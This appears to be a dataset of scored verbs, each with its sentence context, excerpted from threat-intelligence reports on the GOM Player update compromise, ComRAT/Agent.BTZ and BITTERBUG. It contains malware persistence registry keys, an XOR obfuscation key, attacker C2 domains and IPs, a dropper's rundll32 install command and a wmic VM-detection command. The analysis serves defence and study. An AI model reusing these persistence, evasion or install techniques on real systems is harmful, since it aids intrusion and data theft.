"Energy Dialogue within\nEuropean Unition" and so on')(0.7777777777777778, 'drops', ' This drops the malicious file with the\nMD5 7731d42b043865559258464fe1c98513')(0.7916666666666666, 'denote', ' The main\nimplant code is referred to as 白加黑 (‘Black on White’), a term used in the PRC hacking\ncommunity to denote the act of Antivirus avoidance through the loading of malicious\n‘black’ code via non-malicious or trusted ‘white‘ code')(0.5, 'ensuring', ' The installer is responsible for the malware persistence\nmechanism, adding entries to the registry in the following locations, depending on\nWindows Version:\n<table>\nMiancha Persistence Registry Keys\nWindows Vista and later                     HKEY_USERS\\.default\\Software\\Classes\\CLSID\\{ECD4FC4D-\n                                            5213-11D0-B792-00A0C90312E1}\\InProcServer32\\@ =\n                                            expand:"C:\\WINDOWS\\temp\\install.ocx"\nPrior to Windows Vista                      HKEY_USERS\\.default\\Software\\Classes\\CLSID\\{B12AE898-\n                                            D056-4378-A844-6D393FE37956}\\InProcServer32\\@ =\n                                            expand:"C:\\WINDOWS\\temp\\install.ocx"\n</table>\nThe installer will also determine the system architecture (32- or 64-bit) and then\ndeobfuscate the relevant loader DLL to the path ‘C:\\Windows\\temp\\install.ocx’,\nensuring the malware is launched on system start-up')(1.0, 'determine', ' The installer is responsible for the malware persistence\nmechanism, adding entries to the registry in the following locations, depending on\nWindows Version:\n<table>\nMiancha Persistence Registry Keys\nWindows Vista and later                     HKEY_USERS\\.default\\Software\\Classes\\CLSID\\{ECD4FC4D-\n                                            5213-11D0-B792-00A0C90312E1}\\InProcServer32\\@ =\n                                            expand:"C:\\WINDOWS\\temp\\install.ocx"\nPrior to Windows Vista                      HKEY_USERS\\.default\\Software\\Classes\\CLSID\\{B12AE898-\n                                            D056-4378-A844-6D393FE37956}\\InProcServer32\\@ =\n                                            expand:"C:\\WINDOWS\\temp\\install.ocx"\n</table>\nThe installer will also determine the system architecture (32- or 64-bit) and then\ndeobfuscate the relevant loader DLL to the path ‘C:\\Windows\\temp\\install.ocx’,\nensuring the malware is launched on system start-up')(1.0, 'is', ' The installer is responsible for the malware persistence\nmechanism, adding entries to the registry in the following locations, depending on\nWindows Version:\n<table>\nMiancha Persistence Registry Keys\nWindows Vista and later                     HKEY_USERS\\.default\\Software\\Classes\\CLSID\\{ECD4FC4D-\n                                            5213-11D0-B792-00A0C90312E1}\\InProcServer32\\@ =\n                                            expand:"C:\\WINDOWS\\temp\\install.ocx"\nPrior to Windows Vista                      HKEY_USERS\\.default\\Software\\Classes\\CLSID\\{B12AE898-\n                                            D056-4378-A844-6D393FE37956}\\InProcServer32\\@ =\n                                            expand:"C:\\WINDOWS\\temp\\install.ocx"\n</table>\nThe installer will also determine the system architecture (32- or 64-bit) and then\ndeobfuscate the relevant loader DLL to the path ‘C:\\Windows\\temp\\install.ocx’,\nensuring the malware is launched on system start-up')(0.7, 'adding', ' The installer is responsible for the malware persistence\nmechanism, adding entries to the registry in the following locations, depending on\nWindows Version:\n<table>\nMiancha Persistence Registry Keys\nWindows Vista and later                     HKEY_USERS\\.default\\Software\\Classes\\CLSID\\{ECD4FC4D-\n                                            5213-11D0-B792-00A0C90312E1}\\InProcServer32\\@ =\n                                            expand:"C:\\WINDOWS\\temp\\install.ocx"\nPrior to Windows Vista                      HKEY_USERS\\.default\\Software\\Classes\\CLSID\\{B12AE898-\n                                            D056-4378-A844-6D393FE37956}\\InProcServer32\\@ =\n                                            expand:"C:\\WINDOWS\\temp\\install.ocx"\n</table>\nThe installer will also determine the system architecture (32- or 64-bit) and then\ndeobfuscate the relevant loader DLL to the path ‘C:\\Windows\\temp\\install.ocx’,\nensuring the malware is launched on system start-up')(0.09090909090909091, 'mean', "\n\nThe installer component is referred to by the author as ‘miansha' which, according to an\nEast Asia Cyber Threat Intelligence Researcher, is likely Miǎnshā (免杀), a phrase\ncommonly used by People’s Republic of China (PRC) hackers to mean ‘anti Antivirus\ndetection’ or ‘Antivirus avoidance’; Symantec<fn>[3]</fn> have named the detection for this\ncode ‘Backdoor.Miancha’, where Miǎnchá (免查, likely shorthand for 免杀查) similarly\nmeans ‘Antivirus avoidance’")(0.625, 'harvested', '\nAmong other items, staff training documents and more than 40,000 emails were stored\non the machine and thought to be harvested by the attacker')(0.5882352941176471, 'communicates', ' The loader, referred to by the malware author as 壳 (shell),\nreads and deobfuscates the main implant code which then communicates with the\nattacker-controlled server at testqweasd.tk (211.43.220.89) on TCP port 443')(0.07692307692307693, 'reads', ' The loader, referred to by the malware author as 壳 (shell),\nreads and deobfuscates the main implant code which then communicates with the\nattacker-controlled server at testqweasd.tk (211.43.220.89) on TCP port 443')(0.42857142857142855, 'compromised', '\n\nThe attack appears to have been the result of the attackers having compromised the\n‘GOM Player’ update server and having it act as a ‘watering hole’, meaning that\nmachines which access the site are delivered malware')(0.19047619047619047, 'Deployed', '\n\n\n<figure>\n\n                                                                      Modified\n                                                                     Update URL\n                                                                                                      app.gomlab.com\n                                                        GOM Player\n                                                       Upd ate Requ est\n\n\n                               1\n                                                GOM Update\n\n                                     2        Download Request\n\n\n                                                                                  GOM Player and\n                                                                                    Malware\n\n          Victim                          3                                                        www.fudousankaitori.jp\n\n\n                                                              Malware Command\n                                                                 And Control\n       Key\n\n\n               Compromised Server\n\n\n               Attacker Infrastructure                                                                 testqweasd.tk\n\n\n</figure>\n<caption>\n     A diagram illustrating the modified flow of the GOM Player update process which led to the compromise\n</caption>\n\n\n<footnote>\n2   http://hummingbird.tistory.com/5187\n</footnote>\n</section>\n                                         <footer>   TLP: WHITE                                        Page 5 / 11</footer>\n\x0c                     <header>TLP: WHITE</header>\n\n\n\n<section>\n<heading>3.2 Malware</heading>\n</section>\n<section>\n<heading>3.2.1 Overview</heading>\n\nDeployed to the system via a compressed bundle containing the official GOM Player\nsetup binary and a self-extracting RAR archive containing the malicious files, the\nmalware consists of a number of individual pieces')(1.0, 'delivering', '\n\nIn addition to delivering system-specific details back to the attacker, Gh0st RAT provides\nthe capability to deploy additional malware, enabling the harvesting of sensitive data\nand enabling the further propagation throughout the infected network')(0.16666666666666666, 'deploy', '\n\nIn addition to delivering system-specific details back to the attacker, Gh0st RAT provides\nthe capability to deploy additional malware, enabling the harvesting of sensitive data\nand enabling the further propagation throughout the infected network')(0.21428571428571427, 'enabling', '\n\nIn addition to delivering system-specific details back to the attacker, Gh0st RAT provides\nthe capability to deploy additional malware, enabling the harvesting of sensitive data\nand enabling the further propagation throughout the infected network')(0.8181818181818182, 'manifested', '\n\nThe observed malicious activity relates to the modification of a file that controls GOM\nPlayer updates, spanning the date range 27th December 2013 to 16th January 2014,\nduring which time these alterations are reported to have only manifested themselves for\nvisitors on certain IP ranges; evidence supporting this claim has not yet been made\npublic')(0.25, 'be', '\n\nTechnical analysis of the implant on the compromised machine has shown it to be a\nvariant of a Trojan which has been in the wild for some years now and continues to be\neffective')(0.38461538461538464, 'is', '\n      Agent.BTZ is a common RAT, a simple library executed on an infected machine')(0.6666666666666666, 'install', ' The dropper executes the following command in order to install a second file:\n<list>\nrundll32.exe %APPDATA%\\Microsoft\\credprov.tlb,Install %APPDATA%\\Microsoft\\shdocvw.tlp\n</list>\nThe second file is shdocw.tlp')(0.7142857142857143, 'shared', ' Furthermore, the attackers also shared a C&C domain')(0.8666666666666667, 'avoid', '\n</list>\n\x0cComRAT’s communication to the command and control server is performed by the browser process and not by\nexplorer.exe in order to avoid being blocked by a firewall on the system or any additional security products')(0.4166666666666667, 'load', ' The purpose is to load the library into each and every process\nexecuted on the infected system')(0.375, 'use', '\n\nAnother very interesting fact: the attackers use COM Object hijacking, the same persistence mechanism as\nCOMpfun, which we described recently')(0.6666666666666666, 'removes', ' The file is xored with the\nfollowing obfuscation key (used by both, Uroburos and Agent.BTZ):\n<list>\n1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6gs923HL34x2f5cvd0fk6c1a0s\n</list>\nHere is the decoded log file content:\n<list>\nuser1@gdata$ ./decode.py winview.ocx\nLog begin: 06.11.2014 22:55:55\nTVer=2.2\n06.11.2014 22:55:55 TVer=2.3\n06.11.2014 22:55:55 CFG: CFG_4\n06.11.2014 22:55:55 User: user1\n06.11.2014 22:55:55 Machine: x86\n06.11.2014 22:55:55 Removing C:\\Documents and Settings\\user1\\Application Data\\\\Microsoft\\\\shdocvw.tlb [2]\n06.11.2014 22:55:55 Removing C:\\Documents and Settings\\user1\\Application Data\\\\Microsoft\\\\oleaut32.dll [2]\n06.11.2014 22:55:55 Removing C:\\Documents and Settings\\user1\\Application Data\\\\Microsoft\\\\oleaut32.tlb [2]\n06.11.2014 22:55:55 Removing C:\\Documents and Settings\\user1\\Application Data\\\\Microsoft\\\\credprov.tlb [2]\n06.11.2014 22:55:55 Removing C:\\Documents and Settings\\user1\\Application Data\\\\Microsoft\\\\libadcodec.dll [2]\n06.11.2014 22:55:55 Removing C:\\Documents and Settings\\user1\\Application Data\\\\Microsoft\\\\libadcodec.tlb [2]\n06.11.2014 22:55:55 Writing C:\\Documents and Settings\\user1\\Application Data\\\\Microsoft\\\\shdocvw.tlb 51200B\nOk\n06.11.2014 22:55:56 Writing C:\\Documents and Settings\\user1\\Application Data\\\\Microsoft\\\\credprov.tlb\n260096B Ok\n06.11.2014 22:55:57 Exit code1 0\n06.11.2014 22:55:57 Writing 3072B Ok\n</list>\nWe can notice that the malware checks if an older version is installed on the system and if this is the case, the\ndropper removes the older version')(0.7272727272727273, 'blends', ' Furthermore, the C&C communication blends into\n      the usual browser traffic and the malware communicates to the browser by named pipe')(0.625, 'contains', '\nIf the malware version in lower than 3.26, the XML log file contains the command and control server information:\n<list>\n\x0c[…]\n<add ke="IsAdmin" value="1" />\n<add key="Http address" value="webonline.mefound.com" />\n<add key="Http address" value="sportacademy.my03.com" />\n<add key="Http address2" value="easport-news.publicvm.com" />\n<add key="Http address2" value="new-book.linkpc.net" />\n<add key="Http idx1" value="4294967295" />\n[…]\n</list>\n</section>\n<section>\n<heading>Summary</heading>\n\nLet us summarize the similarities and differences between Agent.BTZ, Uroburos and ComRAT as far as we can:\n<list>\nSimilarities:\nBefore version 3.26:\n\n      use of the same xor key\n      use of the same file name for the log\n\n\n\nOn all versions:\n</list>\n      Some parts of the code are exactly the same (appears to be copy & paste)')(0.7777777777777778, 'creates', '\n</section>\n<section>\n\x0c<heading>Dropper’s log file</heading>\n\nIf the version of the malware is older than 3.26, the dropper creates an additional file called winview.ocx')(0.5714285714285714, 'install', '\n</section>\n<section>\n<heading>File installation</heading>\n\nThe first task of the malware is to install the file credprov.tlb in %APPDATA%\\Microsoft\\')(0.1875, 'observed', ' Though many of the samples that we have observed use direct IPs for HTTP communications, we have\nobserved more limited use of a No-IP domain')(1.0, 'was', " Interestingly, this SFXRAR's filename was the only lure element related to the MH370 event; it did not contain a decoy document")(0.5769230769230769, 'using', ' The debug path of "umairaziz27" led us to Twitter<fn>42</fn> and LinkedIn<fn>43</fn> accounts (on which a matching alias is used) that belong to a Tranchulas employee named Umair Aziz, who identified himself as an Information Security Analyst<fn>44</fn> and graduate of National University of Sciences and Technology<fn>45</fn> (NUST).<fn>46</fn> One of these samples was probably used in attacks in late summer 2013, using a "leaked report" lure which contained a decoy document related to Pakistan\'s alleged inability to locate Osama Bin Laden')(1.0, 'communicating', ' To our knowledge this customized malware\nhas only ever been observed hosted on and communicating with two command and control nodes: 199.91.173.43<fn>1</fn> and\n199.91.173.45.<fn>2</fn> <fn>3</fn> According to Whois records, those IP addresses were registered to a web-hosting firm in Kansas City,\nMissouri')(1.0, 'hosted', ' To our knowledge this customized malware\nhas only ever been observed hosted on and communicating with two command and control nodes: 199.91.173.43<fn>1</fn> and\n199.91.173.45.<fn>2</fn> <fn>3</fn> According to Whois records, those IP addresses were registered to a web-hosting firm in Kansas City,\nMissouri')(0.2777777777777778, 'beacon', '\n\n\n<figure></figure>\n\n            <caption>       Figure 13: Example recovery.txt file from VMware virtual machine</caption>\n\n\nNext BITTERBUG typically will beacon to the C2 server by sending the computer name and username of the compromised\nsystem')(1.0, 'open', '\n\n\n<figure></figure>\n\n                 <caption>   Timeline of BITTERBUG characteristics vs.ThreatConnect events</caption>\n</section>\n\n\n\n<footer>12  •     OPERATION ARACHNOPHOBIA</footer>\n\n\x0c\n<section>\n<heading>Details</heading>\nUpon execution the self-extracting RAR may install <BITTERBUG>.exe and the following DLLs:\n<list>\n•\t libcurld.dll – Used for downloading and uploading files\n\n•\t msvcm90d.dll – C runtime library\n\n•\t msvcp90d.dll – C runtime library\n\n•\t msvcr90d.dll – C runtime library\n</list>\nThe self-extracting RAR may install the following benign configuration files:\n<list>\n•\t Microsoft.VC90.DebugCRT.manifest – Compilation artifact\n\n•\t BtcirEt.DZU – Self-extracting RAR configuration file\n\n•\t SJeXSrA.KNX – Self-extracting RAR configuration file\n\n•\t VCAKSQl.TNT – Self-extracting RAR configuration file\n</list>\nBITTERBUG first may execute the following Windows Management Instrumentation (WMI) command to detect the presence of a\nvirtual machine (VM):\n<list>\n•\t cmd.exe /c wmic diskdrive list brief >\n  “%APPDATA%\\Microsoft\\recovery.txt”\n</list>\nBITTERBUG then may open recovery.txt and check for the presence of strings VBox or VMware')(0.8181818181818182, 'check', '\n\n\n<figure></figure>\n\n                 <caption>   Timeline of BITTERBUG characteristics vs.ThreatConnect events</caption>\n</section>\n\n\n\n<footer>12  •     OPERATION ARACHNOPHOBIA</footer>\n\n\x0c\n<section>\n<heading>Details</heading>\nUpon execution the self-extracting RAR may install <BITTERBUG>.exe and the following DLLs:\n<list>\n•\t libcurld.dll – Used for downloading and uploading files\n\n•\t msvcm90d.dll – C runtime library\n\n•\t msvcp90d.dll – C runtime library\n\n•\t msvcr90d.dll – C runtime library\n</list>\nThe self-extracting RAR may install the following benign configuration files:\n<list>\n•\t Microsoft.VC90.DebugCRT.manifest – Compilation artifact\n\n•\t BtcirEt.DZU – Self-extracting RAR configuration file\n\n•\t SJeXSrA.KNX – Self-extracting RAR configuration file\n\n•\t VCAKSQl.TNT – Self-extracting RAR configuration file\n</list>\nBITTERBUG first may execute the following Windows Management Instrumentation (WMI) command to detect the presence of a\nvirtual machine (VM):\n<list>\n•\t cmd.exe /c wmic diskdrive list brief >\n  “%APPDATA%\\Microsoft\\recovery.txt”\n</list>\nBITTERBUG then may open recovery.txt and check for the presence of strings VBox or VMware')(0.21052631578947367, 'utilized', '\n\n•\t The threat actors utilized a hosting provider that is a Pakistani-based company with subleased VPS space within the U.S')(0.4166666666666667, 'executed', ' The final two\nfiles are downloaded to the user’s Startup directory and executed at startup in order to maintain persistence')(0.95, 'used', ' Connections to its C2 nodes relied on\nPHP and used communications that included “.php?compname=” and “.php?srs=”, as well as direct file/component retrieval\nfrom the C2s')(1.0, 'relied', ' Connections to its C2 nodes relied on\nPHP and used communications that included “.php?compname=” and “.php?srs=”, as well as direct file/component retrieval\nfrom the C2s')(0.6, 'installed', ' We have observed BITTERBUG installed by a self-extracting RAR archive\ndisguised as a screensaver')(0.75, 'disguised', ' We have observed BITTERBUG installed by a self-extracting RAR archive\ndisguised as a screensaver')(0.4, 'used', '\n\n<figure></figure>\n<caption>Figure 11: Generic Debug Path</caption>\n\nBetween December 2013 and late March 2014, we observed several new lures used in BITTERBUG self-extracting RAR (SFXRAR) files')(0.5, 'used', ' The threat actor appears to\nhave exclusively used VPSNOC, a probable Pakistan-based VPS service provider who leased U.S')(0.35, 'enter', ' The backdoor then may\nenter an infinite sleep loop if recovery.txt contains either one of the aforementioned strings (Example in Figure 13)')(0.9090909090909091, 'communicating', '\n\n•\t The customized malware (BITTERBUG) used by these threat actors has only been observed hosted on and communicating with\n    two IP addresses operated by a Pakistan-based hosting provider')(0.9090909090909091, 'hosted', '\n\n•\t The customized malware (BITTERBUG) used by these threat actors has only been observed hosted on and communicating with\n    two IP addresses operated by a Pakistan-based hosting provider')(0.2857142857142857, 'appears', ' BITTERBUG appears to be virtual machine aware\nand may not execute on a VMWare or VirtualBox VM')(0.6666666666666666, 'determined', ' FireEye\nanalyzed the malware, which they call BITTERBUG, and determined it to be a custom backdoor')(0.5454545454545454, 'conceal', ' Interestingly, the samples compiled following the blog publication used entirely new and generic debug paths (Figure 11) as well as a compilation tactic to conceal the C2 address from static analysis')(0.3333333333333333, 'downloading', '\n\n</section>\n\n\n<footer>11    •     OPERATION ARACHNOPHOBIA</footer>\n\n<section>\n<heading>\n\x0cAPPENDIX</heading>\n</section>\n<section>\n<heading>\nAPPENDIX A: Malware Details\n</heading>\n</section>\n<section>\n<heading>BITTERBUG</heading>\nBITTERBUG is a backdoor executable capable of uploading and downloading files, listing running processes, generating file listings,\nand automatically transferring selected files to its command and control (C2) server')(0.3333333333333333, 'uploading', '\n\n</section>\n\n\n<footer>11    •     OPERATION ARACHNOPHOBIA</footer>\n\n<section>\n<heading>\n\x0cAPPENDIX</heading>\n</section>\n<section>\n<heading>\nAPPENDIX A: Malware Details\n</heading>\n</section>\n<section>\n<heading>BITTERBUG</heading>\nBITTERBUG is a backdoor executable capable of uploading and downloading files, listing running processes, generating file listings,\nand automatically transferring selected files to its command and control (C2) server')(0.18518518518518517, 'is', '\n\n</section>\n\n\n<footer>11    •     OPERATION ARACHNOPHOBIA</footer>\n\n<section>\n<heading>\n\x0cAPPENDIX</heading>\n</section>\n<section>\n<heading>\nAPPENDIX A: Malware Details\n</heading>\n</section>\n<section>\n<heading>BITTERBUG</heading>\nBITTERBUG is a backdoor executable capable of uploading and downloading files, listing running processes, generating file listings,\nand automatically transferring selected files to its command and control (C2) server')(0.75, 'generating', '\n\n</section>\n\n\n<footer>11    •     OPERATION ARACHNOPHOBIA</footer>\n\n<section>\n<heading>\n\x0cAPPENDIX</heading>\n</section>\n<section>\n<heading>\nAPPENDIX A: Malware Details\n</heading>\n</section>\n<section>\n<heading>BITTERBUG</heading>\nBITTERBUG is a backdoor executable capable of uploading and downloading files, listing running processes, generating file listings,\nand automatically transferring selected files to its command and control (C2) server')(0.75, 'listing', '\n\n</section>\n\n\n<footer>11    •     OPERATION ARACHNOPHOBIA</footer>\n\n<section>\n<heading>\n\x0cAPPENDIX</heading>\n</section>\n<section>\n<heading>\nAPPENDIX A: Malware Details\n</heading>\n</section>\n<section>\n<heading>BITTERBUG</heading>\nBITTERBUG is a backdoor executable capable of uploading and downloading files, listing running processes, generating file listings,\nand automatically transferring selected files to its command and control (C2) server')(0.8333333333333334, 'transferring', '\n\n</section>\n\n\n<footer>11    •     OPERATION ARACHNOPHOBIA</footer>\n\n<section>\n<heading>\n\x0cAPPENDIX</heading>\n</section>\n<section>\n<heading>\nAPPENDIX A: Malware Details\n</heading>\n</section>\n<section>\n<heading>BITTERBUG</heading>\nBITTERBUG is a backdoor executable capable of uploading and downloading files, listing running processes, generating file listings,\nand automatically transferring selected files to its command and control (C2) server')(0.6086956521739131, 'relies', ' The backdoor relies on various support components, including the non-malicious, publically available Libcurl<fn>40</fn> for installation, launch, and communications')(0.7142857142857143, 'extract', ' Upon execution, the self-extracting RAR archive may extract configuration files, dependency DLLs, and\nthe BITTERBUG executable')(0.7142857142857143, 'used', ' One from December contained several BITTERBUG variants and used a decoy PDF document (Figure 12) related to the December arrest of Devyani Khobragade,<fn>47</fn> an Indian diplomat in the United States')(0.8076923076923077, 'observed', ' In spring 2014, we observed a SFXRAR file with a filename lure related to the March 2014 disappearance of Malaysis Airlines Flight 370<fn>48</fn> (cast as a Pakistan-related hijacking)')(0.8461538461538461, 'rely', '\n\n<figure></figure>\n<caption>Figure 12: Screenshot of Indian diplomat arrest decoy PDF</caption>\n\nBITTERBUG continued to rely on the same network behaviors to communicate with its C2s')(0.875, 'download', '\n\nBITTERBUG then may attempt to download the files listed in Table 1')(0.5, 'delete', ' The purpose of this command might be to delete older versions of BITTERBUG, although we have not observed this\ncommand occurring in the wild')